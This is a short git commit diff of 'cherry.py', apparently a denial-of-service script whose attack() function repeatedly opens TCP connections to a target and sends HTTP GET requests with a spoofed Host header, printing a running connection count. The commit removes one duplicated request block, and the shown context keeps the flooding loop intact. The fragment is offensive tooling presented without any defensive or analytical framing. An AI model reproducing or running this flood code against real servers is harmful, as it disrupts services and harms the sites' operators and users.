37365289c7d6a1823ed75e75b187528686bcf7f5
SYNDCAKE <68364016+SYNDCAKE@users.noreply.github.com>
2020-07-19 13:42:07 -0700

    Update cherry.py

--- cherry.py
+++ cherry.py
@@ -47,13 +47,6 @@ def attack():
         s.sendto(("Host: " + fake_ip + " \r\n\r\n").encode('ascii'), (target, port))
         s.close()
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + " \r\n\r\n").encode('ascii'), (target, port))
-        s.close()
-
-
         global connected
         connected += 1
         print(connected)
